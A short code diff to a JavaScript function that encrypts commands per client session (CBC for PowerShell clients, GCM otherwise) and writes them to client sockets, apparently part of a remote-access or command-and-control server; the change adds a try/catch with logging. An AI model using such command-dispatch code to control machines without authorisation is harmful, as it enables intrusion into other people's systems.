@@ -101,22 +101,26 @@ const showActiveClients = () => {
  * @param {string} command 
  */
 const executeClientCommand = async (client, command) => {
-    let cipher = 'aes-256-gcm';
-    // powershell needs cbc instead of gcm
-    if (client.type === 'ps') {
-        cipher = 'aes-256-cbc';
-    }
-    const payload = await encryptData(command, client.sessionId, cipher);
-    if (payload) {
-        return new Promise((resolve) => {
-            if (client.socket.write(payload) === true) {
-                // wait
-            } else {
-                client.socket.once("drain", resolve(true));
-            }
-        });
-    } else {
-        throw new Error("Payload invalid.");
+    try {
+        let cipher = 'aes-256-gcm';
+        // powershell needs cbc instead of gcm
+        if (client.type === 'ps') {
+            cipher = 'aes-256-cbc';
+        }
+        const payload = await encryptData(command, client.sessionId, cipher);
+        if (payload) {
+            return new Promise((resolve) => {
+                if (client.socket.write(payload) === true) {
+                    // wait
+                } else {
+                    client.socket.once("drain", resolve(true));
+                }
+            });
+        } else {
+            throw new Error("Payload invalid.");
+        }
+    } catch (error) {
+        logError(`Exception: ${error.message}`);
     }
 };
 
